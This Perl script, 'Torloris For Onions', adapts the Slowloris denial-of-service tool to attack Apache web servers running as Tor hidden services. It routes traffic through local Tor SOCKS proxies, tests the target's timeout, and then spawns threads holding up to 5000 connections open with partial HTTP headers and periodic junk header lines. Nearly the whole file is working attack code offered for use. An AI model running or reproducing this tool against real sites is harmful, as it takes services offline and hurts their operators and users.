#!/bin/perl

##################TorLoris For Onions######################
# Based on the SlowLoris tool by Robert "RSnake" Hansen
# bit.ly/1R6TKDO (Defunct: http://ha.ckers.org/slowloris/)
# Updated to work via Tor by RootSecks
# Crudely adapted by @te_taipo to only attack Tor Hidden Service Apache webservers
######################

###########################Setup###########################
#Use the the strict package because...
use strict;
#Include the socket functions of PERL
use IO::Socket;
use IO::Socket::Socks;	
use Getopt::Long qw(GetOptions);
#Include threading package
use threads;
#Ignore sigs
$SIG{'PIPE'} = 'IGNORE'; 
######################END OF SETUP###########################

print <<EOTEXT;
CCCCCCCCCCOOCCOOOOO888\@8\@8888OOOOCCOOO888888888\@\@\@\@\@\@\@\@\@8\@8\@\@\@\@888OOCooocccc::::
CCCCCCCCCCCCCCCOO888\@888888OOOCCCOOOO888888888888\@88888\@\@\@\@\@\@\@888\@8OOCCoococc:::
CCCCCCCCCCCCCCOO88\@\@888888OOOOOOOOOO8888888O88888888O8O8OOO8888\@88\@\@8OOCOOOCoc::
CCCCooooooCCCO88\@\@8\@88\@888OOOOOOO88888888888OOOOOOOOOOCCCCCOOOO888\@8888OOOCc::::
CooCoCoooCCCO8\@88\@8888888OOO888888888888888888OOOOCCCooooooooCCOOO8888888Cocooc:
ooooooCoCCC88\@88888\@888OO8888888888888888O8O8888OOCCCooooccccccCOOOO88\@888OCoccc
ooooCCOO8O888888888\@88O8OO88888OO888O8888OOOO88888OCocoococ::ccooCOO8O888888Cooo
oCCCCCCO8OOOCCCOO88\@88OOOOOO8888O888OOOOOCOO88888O8OOOCooCocc:::coCOOO888888OOCC
oCCCCCOOO88OCooCO88\@8OOOOOO88O888888OOCCCCoCOOO8888OOOOOOOCoc::::coCOOOO888O88OC
oCCCCOO88OOCCCCOO8\@\@8OOCOOOOO8888888OoocccccoCO8O8OO88OOOOOCc.:ccooCCOOOO88888OO
CCCOOOO88OOCCOOO8\@888OOCCoooCOO8888Ooc::...::coOO88888O888OOo:cocooCCCCOOOOOO88O
CCCOO88888OOCOO8\@\@888OCcc:::cCOO888Oc..... ....cCOOOOOOOOOOOc.:cooooCCCOOOOOOOOO
OOOOOO88888OOOO8\@8\@8Ooc:.:...cOO8O88c.      .  .coOOO888OOOOCoooooccoCOOOOOCOOOO
OOOOO888\@8\@88888888Oo:. .  ...cO888Oc..          :oOOOOOOOOOCCoocooCoCoCOOOOOOOO
COOO888\@88888888888Oo:.       .O8888C:  .oCOo.  ...cCCCOOOoooooocccooooooooCCCOO
CCCCOO888888O888888Oo. .o8Oo. .cO88Oo:       :. .:..ccoCCCooCooccooccccoooooCCCC
coooCCO8\@88OO8O888Oo:::... ..  :cO8Oc. . .....  :.  .:ccCoooooccoooocccccooooCCC
:ccooooCO888OOOO8OOc..:...::. .co8\@8Coc::..  ....  ..:cooCooooccccc::::ccooCCooC
.:::coocccoO8OOOOOOC:..::....coCO8\@8OOCCOc:...  ....:ccoooocccc:::::::::cooooooC
....::::ccccoCCOOOOOCc......:oCO8\@8\@88OCCCoccccc::c::.:oCcc:::cccc:..::::coooooo
.......::::::::cCCCCCCoocc:cO888\@8888OOOOCOOOCoocc::.:cocc::cc:::...:::coocccccc
...........:::..:coCCCCCCCO88OOOO8OOOCCooCCCooccc::::ccc::::::.......:ccocccc:co
.............::....:oCCoooooCOOCCOCCCoccococc:::::coc::::....... ...:::cccc:cooo
 ..... ............. .coocoooCCoco:::ccccccc:::ccc::..........  ....:::cc::::coC
   .  . ...    .... ..  .:cccoCooc:..  ::cccc:::c:.. ......... ......::::c:cccco
  .  .. ... ..    .. ..   ..:...:cooc::cccccc:.....  .........  .....:::::ccoocc
       .   .         .. ..::cccc:.::ccoocc:. ........... ..  . ..:::.:::::::ccco
Welcome to Torloris For Onions
EOTEXT

my $add;
GetOptions('add=s' => \$add) or die "Usage: $0 --add address";

# Server info and port info. 
	my $server = shift || $add; # input a 22 char length Onion address 
	my $protoport = "80"; #Port of web server to attack
	my $sleeptimer; #A variable to hold a timer
	my $threadcon = 20; #The amount of loops per thread/
	my $concount = 5000; #The total number of connections
	my $socktimeout = 5; #Timeout value for the socks socket
	my $doesitwork; #Variable to a working/notworking thing
	my @timervalues = ( "2", "2", "2", "2", "2"); #Various values to be used when making connectons
	my @proxyaddress = ( "127.0.0.1", "127.0.0.1", "127.0.0.1", "127.0.0.1", "127.0.0.1", "127.0.0.1", "127.0.0.1", "127.0.0.1", "127.0.0.1" ); #The address of the proxy. 
	my @proxyportnums = ( "9051", "9052", "9053", "9054", "9055", "9056", "9057", "9058", "9059");
	my @socksver = ( "5", "5", "5", "5", "5", "5", "5", "5", "5" ); #Socks Version
# End of server info and port info.

# Make Torloris an onion attacker only!
if ( ( length $server == 22 ) && ( substr($server, 16, 6) eq ".onion" ) ) {
	$server =~ s/['\$','\#','\@','\~','\!','\&','\*','\(','\)','\[','\]','\;','\,','\.','\:','\?','\^',' ', '\`','\\','\/']//g;
	substr($server, 16, 5) = "";
} else {
	die( "Must be an onion website URL!" );
}

#Randomize the first proxy to use for testing :)
my $firstrandomnumber = int( rand(9));

#Create connection to test delay
print "Trying random Tor port: " . $proxyportnums[$firstrandomnumber] . " (if fail, try again).\r\n";
if ( my $sock = IO::Socket::Socks->new(ProxyAddr => $proxyaddress[$firstrandomnumber],
				       ProxyPort => $proxyportnums[$firstrandomnumber],
				       ConnectAddr => $server . '.onion',
				       ConnectPort => $protoport,
				       SocksVersion => $socksver[$firstrandomnumber],
				       Timeout => $socktimeout)) {

	##If the connection works wee generate a http header with some junk as a get but miss the last new line and carridge return chars
	my $httprequest =" GET / " . int( rand(99999999999999) ) . " HTTP/1.1\r\n Host: " . $server . ".onion\r\n User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\nContent-Length: 42\r\n\ ";
	
	##If we can send the header down the sock we created earlier
	if (print $sock $httprequest) {
		#Print a success message
		print "Successfull data send\r\n";
	} else {
		#print and unsuccessful massage
		print "unsuccessful data send, exiting\r\n";
		exit;
	}
	
	#Yes it does work
	$doesitwork = 1;

	#Timeout Calc function :)
	for (my $blarg = 0; $blarg <= $#timervalues; $blarg++) {
		#Print status message
		print "Testing $timervalues[$blarg] second delay\r\n";
		
		#Sleep for the timer values
		sleep($timervalues[$blarg]);
		
		#send an update to the webserver to test delay
		if ( print $sock "X-a: b\r\n" ) {
			#If it works, then the timeout can be this or less
			print "This timer worked\r\n";
			#Update the sleeptimer variable to contain the successful timer
			$sleeptimer = $timervalues[$blarg];
		} else {
			#if it doesn't work
			if ( $SIG{__WARN__} ) {
					#We fail it
					print "Failed timeout test at $timervalues[$blarg] :(\r\n";
					#and the timer = the previous value
					$sleeptimer = $timervalues[$blarg -1];

			}

			last;
		}
				
	}
	
	print "Will connect to $server.onion on port $protoport with a $sleeptimer second timer on each socket\r\n";
	
} else {
	
	#no it doesn't work
	$doesitwork = 0;
	
	#lol
	print "FAILED\r\n";
	
}

#if the inital connection works
if ($doesitwork == 1) {

	#define some vars
	my @threads;
	
	my $proxyportnumber;
	
	my $torinstance = 0;
	
	my $proxycounter;
	
	my $inum;
	
	my $threadnumbervar = 1;
	
	#while < the total number of connections
	while ($inum < $concount) {
		
		#What tor instance is used?
		if ($torinstance == 0) {
				$proxycounter =1;
				$torinstance = 1;
		} elsif ($torinstance == 1) {
				$proxycounter =2;
				$torinstance = 2;
		} elsif ($torinstance == 2) {
				$proxycounter =3;
				$torinstance = 3;
		} elsif ($torinstance == 3) {
				$proxycounter =4;
				$torinstance = 4;
		} elsif ($torinstance == 4) {
				$proxycounter =5;
				$torinstance = 5;
		} elsif ($torinstance == 5) {
				$proxycounter =6;
				$torinstance = 6;
		} elsif ($torinstance == 6) {
				$proxycounter =7;
				$torinstance = 7;
		} elsif ($torinstance == 7) {
				$proxycounter =8;
				$torinstance = 8;
		} elsif ($torinstance == 8) {
				$proxycounter =9;
				$torinstance = 9;
		} elsif ($torinstance == 9) {
				$proxycounter =0;
				$torinstance = 0;
		}
				
		#create a new thread for a connection loop that has all the relevent information
		$threads[$inum] = threads->create(\&connectionsub, $threadcon, $server . '.onion', $protoport,$socktimeout, 'tcp', $sleeptimer, $proxyportnums[$proxycounter], $proxyaddress[$proxycounter], $socksver[$proxycounter], $threadnumbervar );
		#Thread online :)
		print "Thread $threadnumbervar ONLINE\r\n";
		#Add the threadcon value to the inum counter
		$inum = $inum + $threadcon;
		$threadnumbervar ++;
		
	}
	
	# Get all the threads into an array
	my @letussee = threads->list;
	# While the number of threads is greater than 0
	while ($#letussee > 0) {

	}
	print "Threads all dead :( \r\n";
	
} else {
	
	#no it doesn't work :(
	print "Does not work\r\n";
	
}

#Connection sub for doing the business
sub connectionsub {
	#define a bunch of vars
	my ($connum, $threadserver, $threadport, $threadtimeout, $threadproto, $threaddelaytime, $proxport, $proxaddr, $threadsockver, $threadconnumber) = @_;
	my @threadsock;
	my @threadworking;
	my $xnum;

	#while always
	while (1) {
		
		print "Thread $threadconnumber Working\r\n";
				
		#For each xnum in the total connections per thread
		for $xnum (1 .. $connum) {
			#Generate a sock (and an if conditional)
			if ($threadsock[$xnum] = new IO::Socket::Socks( ProxyAddr => $proxaddr,
										ProxyPort => $proxport,
										ConnectAddr => $threadserver,
										ConnectPort => $threadport,
										SocksVersion => $threadsockver,
										Timeout => $threadtimeout ))
			{
				#Generate a request header
				my $threadrequest = " GET / " . int( rand(99999999999999) ) . " HTTP/1.1\r\n Host: " . $server . ".onion\r\n User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\nContent-Length: 42\r\n\ ";
				
				#Put the sock in a filehandle
				my $threadhandle = $threadsock[$xnum];
				
				$threadworking[$xnum] = 1;
				
				#If the connection works
				if ($threadhandle) {
					
					#See what happens
					print $threadhandle "$threadrequest";
						if ( $SIG{__WARN__} ) {
							$threadworking[$xnum] = 0;
							close $threadhandle;
						} else {
							
							$threadworking[$xnum] = 1;

						}

				}

			} else {
				
				$threadworking[$xnum] = 0;
			}

		}

		for my $znum (1 .. $connum) {
			if ($threadworking[$znum] == 1) {
				if ($threadsock[$znum]) {

					my $threadhandle = $threadsock[$znum];

					if (print $threadhandle "X-a: b\r\n") {

						$threadworking[$znum] = 1;

					} else {

						$threadworking[$znum] = 0;

					}

				} else {

					$threadworking[$znum] = 0;

				}
			}

		}

		sleep($threaddelaytime);

	}

}
